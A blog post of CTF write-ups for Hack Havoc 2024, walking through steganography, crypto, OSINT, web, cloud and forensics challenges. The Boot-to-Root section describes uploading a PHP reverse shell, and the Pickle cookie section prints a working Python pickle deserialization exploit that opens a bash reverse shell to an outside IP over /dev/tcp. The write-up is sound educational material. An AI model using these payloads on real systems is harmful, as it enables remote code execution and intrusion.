---
title: HACK HAVOC CTF Writeups Oct 2024
published: 2024-08-08
description: Some Writeups of HACK HAVOC 2024.
tags: [HACK HAVOC, Oct 2024]
image: "cover.jpg"
category: CTF Writeup
draft: false
---

# Hack Havoc CTF Writeups October 2024

# Welcome

![image.png](images/Welcome/image.png)

- Here you will get the last part of the flag from Instagram and other half from Discord through bot
- First Half

![3.png](images/Welcome/bb4ab829-33f9-4e66-8744-4c9b64ac7dc8.png)

- Second Half

![2.png](images/Welcome/213b5f80-fa77-42db-bdec-ea53896e7837.png)

```bash
CM{w3lc0m3_t0_H4ac_H4voc}
```


# Mobile

## APK-ocalypse Now!

![image.png](images/Mobile/APK-ocalypse_Now/image.png)

- I used https://github.com/skylot/jadx for decompiling the APK file,
- After decompiling it i hope around little bit and after some searching found a string which looks like flag but maybe encoded or something,

![image.png](images/Mobile/APK-ocalypse_Now/image1.png)

- So I open up `CyberChef`, and first I try the `ROT13 cipher`, which is a **variation of the caesar cipher**.

![image.png](images/Mobile/APK-ocalypse_Now/image2.png)

- And Boom!!! I got the flag.

```bash
CM{H1dd3n_7L4g_1n_M4nIF35T}
```

# Steganography

## Incidents in Disguise

![image.png](images/Steg/Incidents_in_Disguise/image.png)

- First thing when image any lame hacker thing a lame thing which is steganographic image and i am also lame so i also tried it and yes i was right because an image size 500KB which is very odd so i try to use https://github.com/StefanoDeVuono/steghide tool for reveling content but it was password protected.

![image.png](images/Steg/Incidents_in_Disguise/image1.png)

- So I decided to perform a `dictionary attack` on this using the https://github.com/RickdeJager/stegseek tool (which is a `stehide password-ptotected file cracker`) using `rockyou.txt` wordlist (So Called Hacker’s Wordlist). but unfortunately it is not windows so i used in linux system.
- But after trying different thing like doing plain attack, reversing the whole rockyou and doing different combination i was unable solve it.
- After this, I have decided to see the hint on Discord, which is, `Password contains amos amos amos`, and it also mentioned that `try to do it manually` so know there may be some **non-printable characters problem**.
- So i tries this and boom!!! it worked

![image.png](images/Steg/Incidents_in_Disguise/image2.png)

```bash
CM{Bru73_f0rc3_i5_b35t}
```

## p13ces

![image.png](images/Steg/p13ces/image.png)

- When I visit the website i got many pages and images so i decided to **download all those images**,
- There are in **total 10 images**,

![image.png](images/Steg/p13ces/image1.png)

 

- So again i tries https://github.com/StefanoDeVuono/steghide on each image and i got piece of flag from `2.jpg`.

![image.png](images/Steg/p13ces/image2.png)

- Also Take the content and make a that as `wordlist` because it maybe work as **key to open the next images**,

![image.png](images/Steg/p13ces/image3.png)

![image.png](images/Steg/p13ces/image4.png)

- I tried every other image to open with password but each image needs password so go for next step,
- After trying on couple of images i finally get new flag from `6.jpg`,

![image.png](images/Steg/p13ces/image5.png)

- Again doing same thing, take the flag piece and append all those words on wordlist,

![image.png](images/Steg/p13ces/image6.png)

- From This 9.jpg.out we get a https://pastebin.com/V3nbr0sm link which leads to another piece of flag,

![image.png](images/Steg/p13ces/image7.png)

![image.png](images/Steg/p13ces/image8.png)

- So finally got the final piece,

![image.png](images/Steg/p13ces/image9.png)

- Now this is Assembling time,

![image.png](images/Steg/p13ces/image10.png)

- I Think maybe some thing missing so i looked up all the images and I got blink and boom got all flag just like this,
- By assembling the images,

![image.png](images/Steg/p13ces/image11.png)

```bash
CM{{Break_1t_1int0_p13ces}
```

- I think i got the flag and submitted but **Incorrect!!!!!!!!!!!!!!!!!!!!**
- So I Thought i missed something which is `Part 4th’s Description`,

```bash
At last, Lira reached the heart of the forest, where a small clearing lay undisturbed. In the center, a worn parchment was pinned to the ground. Written on it was the a riddle that can contain the final clue:

"In the realm of shapes, I’m the base of a square
In the world of shapes, I form a perfect square,
A hint lies in balance; I help you explore,
Count me well, and you’ll see I am more.
I'm just a single digit number, all alone."

It dawned on her, she had to put all the pieces together to unlock the final part of the 5 pieces hidden message.

FLAG: CM{xxxxx_#x_#xxx#_#_x##xxx} 
```

- I have to put it in the format mentioned so here is a poem which gives hints about it,
- ”#” means numbers and “x” means Alphabets so let’s arrange it,

 

![image.png](images/Steg/p13ces/image12.png)

- Everything Looks Perfect but this “#” means a number is missing which i got from that silly poem,

```bash
"In the realm of shapes, I’m the base of a square
In the world of shapes, I form a perfect square,
A hint lies in balance; I help you explore,
Count me well, and you’ll see I am more.
I'm just a single digit number, all alone."
```

- It is single digit number and `4` is perfect square so here is the whole FLAG.
- Haaaa, Easyyyyy Peasyyyyyy. 🫠

```bash
CM{Break_1t_1int0_4_p13ces}
```

# OSINT
## Hack Uncovered

![image.png](images/OSINT/Hack_Uncovered/image.png)

- Based on the description and some common sense, I found this PDF from Linkedin Cybermaterial Page,

![21.png](images/OSINT/Hack_Uncovered/21.png)

- We need to create a flag related to a document about incidents or alerts from July 2024.
- This PDF should contain the information we need to create the flag.
- And Here is The Flag Easy,
    - Top Threat - `DarkGate`
    - Top Vulnerability - `CVE-2024-5217`
    - Top Regulations - `KOPSA`

```bash
CM{DarkGate_CVE-2024-5217_KOPSA}
```

## CyberMaterial Edition!

![image.png](images/OSINT/CyberMaterial_Edition/image.png)

- Following the given description, I applied the same approach and searched on Instagram. This led me to find the relevant post.

![image.png](images/OSINT/CyberMaterial_Edition/image1.png)

![image.png](images/OSINT/CyberMaterial_Edition/image2.png)

![image.png](images/OSINT/CyberMaterial_Edition/8c922c6d-4e28-42c1-8fd3-721921cba448.png)

- After some scrolling I got the flag in the dark shade, Why this is much of easy, 🫠

```bash
CM{H4LL_of_H4ck5_Thr3aTs}
```

# Reverse Engineering

## More Like ‘Enig-me’

![image.png](images/Rev/More_Like_Enig-me/image.png)

- This challenge was the hardest one in the CTF, and I was stuck on it for several days. Fortunately, the hint provided the `rotor configurations`, `positions`, `reflector`, and `plugboard settings`, which simplified things a bit. They lowered the difficulty level, making it more manageable.
- Here is the Settings,
    - `Rotors : I-II-III`
    - `Reflector : B`
    - `Position : A-D-F (1-4-6)`
    - `Ring : A-A-A (1-1-1)`
    - `Plugboard : A-T B-L`

`Encoded txt : ugtyq djiwc ruejq ebdux hcrqr kiznu hokzy sngry zfxnv gbjki dqknr ma`

`Decoded txt: cybermateial is the world number one cybersecurity data platform.`

![image.png](images/Rev/More_Like_Enig-me/image1.png)

```bash
CM{Rotor_I-II-III_Pos_A-B-C_Reflector_B_Plug_A-T_B-L_Ring_A-A-A} 
```

# Misc

## The Case of the Missing Flag

![image.png](images/Misc/The_Case_of_the_Missing_Flag/image.png)

- When I open this DAT file it is not actually DAT file but SVG file with some weird Values,

![image.png](images/Misc/The_Case_of_the_Missing_Flag/image1.png)

- So I opened it on https://www.svgviewer.dev/ Website,

![image.png](images/Misc/The_Case_of_the_Missing_Flag/image2.png)

- I First Contact I don’t see anything, and I think it is empty, but after looking carefully, I can see the small dot or something.

![image.png](images/Misc/The_Case_of_the_Missing_Flag/image3.png)

- So I Make it Bigger from the code by just tweaking the high and width, **(width="300" height="300” from width="1" height="1”)**

![image.png](images/Misc/The_Case_of_the_Missing_Flag/image4.png)

- This is QR Code but It is Damaged or Intentionally Damaged QR and Those 3 Squares which is `contain the finder pattern` ****so we need to fix it,
- So I just need to that one **Square on Left Corner** so I just Tweak The `M-1 to M1`, Ya That’s It and i got the flag.

![image.png](images/Misc/The_Case_of_the_Missing_Flag/image5.png)

![image.png](images/Misc/The_Case_of_the_Missing_Flag/image6.png)

- I save that QR code and scan it through `zbarimg` ([https://manpages.ubuntu.com/manpages/bionic/man1/zbarimg.1.htm](https://manpages.ubuntu.com/manpages/bionic/man1/zbarimg.1.html)l)
- And Got The Flag Boom!!!!!!! 🫠

![image.png](images/Misc/The_Case_of_the_Missing_Flag/image7.png)

```bash
CM{F0r3n3ic_1s_34sy}
```

# Cryptography

## The Curious Case of the Jumbled Symbols

![image.png](images/Crypto/The_Curious_Case_of_the_Jumbled_Symbols/image.png)

- This Challenge is very piece of cake because i have just google the cipher, and got this,
- Some History : Runes are ancient alphabets (More about https://en.wikipedia.org/wiki/Rune#:~:text=A rune is a letter,and for specialised purposes thereafter)

   

![image.png](images/Crypto/The_Curious_Case_of_the_Jumbled_Symbols/image1.png)

- I Have to Translate The Cipher and Got The Flag!!!!!!! 🫠

![image.png](images/Crypto/The_Curious_Case_of_the_Jumbled_Symbols/image2.png)

```bash
CM{stauiliss_ruins_muharg}
```

## CyberMaterialHavoc

![image.png](images/Crypto/CyberMaterialHavoc/image.png)

• This cipher is unknown to me because I have never seen it before, so I just went to “https://www.dcode.fr/” (one of the best tools for crypto stuff) and I searched for a cipher identifier, and I got this one,

![image.png](images/Crypto/CyberMaterialHavoc/image1.png)

- It is Base92 Encoding so I decode it,

![image.png](images/Crypto/CyberMaterialHavoc/image2.png)

```bash
Base92 Encoding :- AgTIEe5hQ?T5,W.GDyv^N*eRcDuEoizyHNSTN&b$$4m0o9gWL!S\u+^T;/o5m/9YL@HQlje}
```

- Now this cipher is looks common so I again Copy it and Identify which encoding is this,

![image.png](images/Crypto/CyberMaterialHavoc/image3.png)

- It is a https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher which is another `Polyalphabetic Substitution` 
• So I want to decode it, but I need a key for this, so I see around. I have a clue that it must be given anywhere, so I look at the description,

![image.png](images/Crypto/CyberMaterialHavoc/image4.png)

- `CybermaterialHavoc` can be key because it is written without space so tried and Boom!!!!! It works, and again, using dcode itself, I decode it,

![image.png](images/Crypto/CyberMaterialHavoc/image5.png)

```bash
Vigenère cipher :- ZL{YfphiGdxdicgo_Yzkqu'i_Cmtg_Qfpdiscxawtiz_Xdxl_Khdxcltu}
```

- It gives something so i again identify which cipher is it and i got was,

![image.png](images/Crypto/CyberMaterialHavoc/image6.png)

```bash
Atbash Cipher :- XN{XbyviNzgvirzo_Dliow'h_Yvhg_Xbyvihvxfirgb_Wzgz_Kozgulin}
```

- Yes, Atbash Cipher so i decode it, and Done!!!!!!!!!!!!! Got The Flag!! 🫠

![image.png](images/Crypto/CyberMaterialHavoc/image7.png)

```bash
CM{CyberMaterial_World's_Best_Cybersecurity_Data_Platform}
```

# Boot To Root

## Hacker's Fortress

![image.png](images/B2R/Hackers_Fortress/image.png)

- We visit the website. It is a simple PHP-based site, and it has a login form and one registration form, so I first register and log in.

![image.png](images/B2R/Hackers_Fortress/image1.png)

- It has a file upload feature, so as you know what a lame hacker does, 😑 Just upload the PHP shell and get the reverse shell, so for this, spin up the environment.
- Starting ngrok (reverse shell over internet) and netcat.

![image.png](images/B2R/Hackers_Fortress/image2.png)

- And modify the stupid PHP payload of [pentestmonkey](https://github.com/pentestmonkey) and do some editing like ports, etc.

![image.png](images/B2R/Hackers_Fortress/image3.png)

- And Upload the shell on website,

![image.png](images/B2R/Hackers_Fortress/image4.png)

- And through some directory busting I know that it has an upload directory, and it has my shell uploaded.

![image.png](images/B2R/Hackers_Fortress/image5.png)

- And Detonate the Reverse shell B00M!!!!! Got the Shell!!!!!!!!!!.

![image.png](images/B2R/Hackers_Fortress/image6.png)

![image.png](images/B2R/Hackers_Fortress/image7.png)

- After Some Hopping around i finally got the flag,

![image.png](images/B2R/Hackers_Fortress/image8.png)

```bash
CTF{3sc4l4t3d_t0_r00t}
```

# Web

## Dir Dash

![image.png](images/Web/Dir_Dash/image.png)

- I opened the website and plan to first enumerate the sensitive files,

![image.png](images/Web/Dir_Dash/image1.png)

- So I run the https://github.com/maurosoria/dirsearch and got something interesting,
    - /robots.txt

![image.png](images/Web/Dir_Dash/image2.png)

- When I visit the robots.txt it seems normal but scroll bar looking spooky like it means file is too large so check and this what i got!!!!

![image.png](images/Web/Dir_Dash/image3.png)

- I found this another section, but yeah they fooled us,

![image.png](images/Web/Dir_Dash/a5e81d8e-5db0-43f6-b20c-4f7b467168ca.png)

- But Watching Carefully I got the something,

![image.png](images/Web/Dir_Dash/495ded9b-faff-4c42-964c-4a470add9424.png)

- It looks like Hash but i don’t know where to use it, this is where hint helps,
- Which means we have to do FUZZING of file extensions
    
    

```jsx
Domain//////hash............extensions
```

- So i have tries this hash with https://github.com/ffuf/ffuf and try to FUZZ on extension,

```jsx
ffuf -u http://edition1.ctf.cybermaterial.com/c5ba7ff1883453170f7590fa689f1f48FUZZ -w /mnt/d/Cyber_Stuff/SecLists-master/Discovery/Web-Content/web-extensions.txt
```

![image.png](images/Web/Dir_Dash/image4.png)

- And I Found `.aspx` file extension so i try to access that file and B00M!!!! I got the flag!!!

![image.png](images/Web/Dir_Dash/image5.png)

```json
CM{3xten5i0n5_w45_CR4zY}
```

## Pickle Me This Cookie Jar Shenanigans!

![image.png](images/Web/Pickle_Me_This_Cookie_Jar_Shenanigans/image.png)

- This Challenge was quite interesting and challenging also,
- When we visit the website it looks like this,

![image.png](images/Web/Pickle_Me_This_Cookie_Jar_Shenanigans/image1.png)

- As per mentioned in description we know that this server has **cookie deserialization vulnerability** in pickle `(CVE-2022-34668)` and we have to exploit it.
- After some googling around i found some pickle exploit scripts but many of them not properly working so after some head smashing finally got the script which work perfectly.

```python
from base64 import b64encode
import pickle
import subprocess

# Define a class for malicious deserialization
class anti_pickle_serum(object):
    def __reduce__(self):  # Use double underscores
        # This is where the reverse shell command will be executed
        return subprocess.Popen, (["/bin/bash", "-c", "bash -i >& /dev/tcp/13.127.206.16/15354 0>&1"],)

# Serialize the payload and encode it
pickled = pickle.dumps({'serum': anti_pickle_serum()}, protocol=0)
encoded_pickled = b64encode(pickled)

# Print the base64 encoded malicious payload
print(encoded_pickled.decode())
```

- Steps of Exploitation,
    1. Setup The Environment,
        1. Start the `NGROK Server`
        2. Start the `Ncat Server`
        3. Prepare a `Reverse Shell Payload` to Put in Script
    2. Creating the Payload Using Above Script
    3. Go to the Webpage
    4. Add Any Item in Cart
    5. Go to Cart Section
    6. Open up the Application Section Inspect
    7. `Replace the Malicious Cookie` and `Just Refresh` and B00M!!!! Got a Shell 🫠

```python
"/bin/bash -c 'bash -i >& /dev/tcp/13.127.206.16/15354 0>&1'"
```

![image.png](images/Web/Pickle_Me_This_Cookie_Jar_Shenanigans/image2.png)

```python
CM{c0Ngr47S_y0u_ArE_A_Ser1A1_KI11er}
```

## Hashing Numbers

![image.png](images/Web/Hashing_Numbers/image.png)

- When we visit this Website, and click in **<!-- "To find the light, traverse the path." -->,** we can press on Enter Now and i will redirect to another page,

 

![image.png](images/Web/Hashing_Numbers/image1.png)

- After Redirection, We see a puzzled text something like `742-AJM` and we have to unscramble this,
- And scrolling down we an image of dial pad,

![image.png](images/Web/Hashing_Numbers/image2.png)

![image.png](images/Web/Hashing_Numbers/image3.png)

- There also one button named “enter hash---→” which will redirect us to another page which ask for hash and correct hash will provide us flag.

![image.png](images/Web/Hashing_Numbers/5b7806d8-ee8a-4967-a38c-bee2db62e364.png)

![image.png](images/Web/Hashing_Numbers/image4.png)

- So Again We have one image of dial pad When Any Lame Hacker See any image, then they always try stupid things like steg…. so let’s try that,

![image.png](images/Web/Hashing_Numbers/image5.png)

- From this we got some python code, which do something spooky so let’s analyze it,

```python
#You are tasked with securing a sensitive file. To ensure its integrity, 
#you must calculate the SHA-256 hash of the file contents.

import hashlib

# Calculate the value of the mathematical expression

# Replacing Number with its words
# eight = 8, three = 3, two = 2
#value = (5 * eight) + (three * 6) - (two * 4)
value = (5 * eight) + (three * 6) - (two * 4)

# Convert the value to a string
value_str = str(value)

# Calculate the SHA-256 hash
hash_object = hashlib.sha256(value_str.encode())
hash_hex = hash_object.hexdigest()

print(hash_hex)

#Once you have calculated the value of this expression, 
#hash the resulting string using the SHA-256 algorithm. What is the hash?
```

```python
Output: 1a6562590ef19d1045d06c4055742d38288e9e6dcd71ccde5cee80f1d5a774eb
```

![image.png](images/Web/Hashing_Numbers/image6.png)

- We try to enter it into website input field above mentioned, and

![image.png](images/Web/Hashing_Numbers/image7.png)

- If we follow the page and and active dark mode and scroll to the end we got the flag,

![image.png](images/Web/Hashing_Numbers/image8.png)

- But this is not it, we have to make it according to this description,
- `You are tasked with securing a sensitive file. To ensure its integrity, you must calculate the SHA-256 hash of the file contents.`
- Flag structure: CM{XXX-###_##}

```json
CM{SHA256_unhashedvaluenumber}
CM{SHA-256_##}
```

- So as We can see that we have made our flag as per format but there are 2 digits which still missing so, in this we have to do this,
- As per previous code,
    - $value = (5 * eight) + (three * 6) - (two * 4)$
    - $eight = 8, three = 3, two = 2$
    - $(5 * 8) + (3 * 6) - (2 * 4)$
    - $40 + 18 - 8 = 50$

- So Here is The Flag,

```json
CM{SHA-256_50}
```

# Cloud

## Cloudy Records

![image.png](images/Cloud/Cloudy_Records/image.png)

- On the given website, I found nothing. I tried multiple things, like checking the request and response headers, but nothing got any info that it is not cloud.
- Then I try to do something that is very straight forward and that any lame hacker thinks like. I have a domain, so I have tried to see a `DNS lookup` and `DNS records` on this website: [`https://dnschecker.org/`](https://dnschecker.org/)
- And Oooo.. I got something here,

![image.png](images/Cloud/Cloudy_Records/image1.png)

```java
https://storage.googleapis.com/cloudcorps-important/
```

- A Google storage link in TXT records, neet 🫡
- Then I try to access it, and this is what I got.

![image.png](images/Cloud/Cloudy_Records/image2.png)

- There are some files mentioned like,
    1. Hall_of_Hacks_1.pdf
    2. Hall_of_Hacks_2.pdf
    3. Hall_of_Hacks_3.pdf
- So Try to access those files through same URL by just appending files and B00M!!!!!!
- I got the flag.🫠

```java
https://storage.googleapis.com/cloudcorps-important/Hall_of_Hacks_2.pdf
```

![image.png](images/Cloud/Cloudy_Records/image3.png)

```java
CM{GCP_CloudStorage_Bucket_Challenge_20241018}
```

# Forensics

## QR-azy Mystery!

![image.png](images/Forensics/QR-azy_Mystery/image.png)

- After downloading this file it looks like this,

![goneeeee.png](images/Forensics/QR-azy_Mystery/goneeeee.png)

- It is blurred QR-code so we have to make sharper so we can scan it properly,
- I have done this through https://picsart.com/create/editor?category=myFolders&projectId=671fb73d7ff5f51af2d7fee6 and here is the result,

  

![image.png](images/Forensics/QR-azy_Mystery/image1.png)

- And when i scanned it, I got the flag,

![image.png](images/Forensics/QR-azy_Mystery/9a53cc7a-6565-4952-8e02-990f895a6681.png)

```bash
flag{3efd4bd34663e618c70e051505c83f9f}
```

## Dialing for Danger

![image.png](images/Forensics/Dialing_for_Danger/image.png)

- When I open this file it gives me random numbers,

```bash
4 666 555 3 33 66 0 4 2 8 33 0 22 777 444 3 4 33
```

- It looks like cipher so let’s identify which type of cipher is it,

![image.png](images/Forensics/Dialing_for_Danger/image1.png)

- It is a `Multi-Tap Phone (SMS)` Encoding Scheme

![image.png](images/Forensics/Dialing_for_Danger/image2.png)

- And When I decrypt it I found this 3 strings so we have to make flag from it as per description and Gochaa!! Flag is correct!! 🫠

```bash
CM{GOLDEN_GATE_BRIDGE}
```
